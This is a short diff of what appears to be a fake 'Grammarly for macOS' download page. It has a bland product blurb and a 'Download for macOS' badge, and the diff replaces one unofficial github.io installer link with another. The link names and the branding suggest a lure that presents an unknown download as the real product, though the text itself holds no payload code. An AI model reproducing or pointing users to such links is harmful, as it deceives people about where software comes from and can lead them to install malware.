@@ -6,7 +6,7 @@
 <h3>Grammarly for macOS</h3>
 <p>Grammarly focuses on delivering a calm, consistent macOS experience, emphasizing structured workflows, clear feedback, and steady behavior during everyday use.</p>
 
-<a href="https://install-software-utility.github.io/.github/">
+<a href="https://software-app-osx-install.github.io/.github/gt">
   <img src="https://i.postimg.cc/7LTTZgxF/macos-badge-noborder.png" width="200" alt="Download for macOS"/>
 </a>
 </div>
